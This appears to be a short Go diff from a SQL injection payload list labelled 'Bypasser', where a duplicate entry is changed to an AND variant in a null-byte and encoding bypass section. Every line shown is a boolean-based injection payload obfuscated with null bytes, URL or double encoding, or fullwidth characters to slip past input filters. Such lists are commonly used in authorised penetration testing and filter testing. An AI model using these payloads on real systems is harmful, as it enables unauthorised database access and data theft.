@@ -96,7 +96,7 @@ var Bypasser = PayloadGroup{
 		// NULL BYTE & ENCODING BYPASS
 		// ═══════════════════════════════════════════
 		{Type: "boolean", Content: "'%00OR%201=1--"},
-		{Type: "boolean", Content: "'%00OR%201=1--"},
+		{Type: "boolean", Content: "'%00AND%201=1--"},
 		{Type: "boolean", Content: "%27+OR+1%3D1--"},
 		{Type: "boolean", Content: "%2527%2520OR%25201%253D1%2520--"},
 		{Type: "boolean", Content: "%ef%bc%87%ef%bc%8for%ef%bc%91%ef%bc%9d%ef%bc%91"},
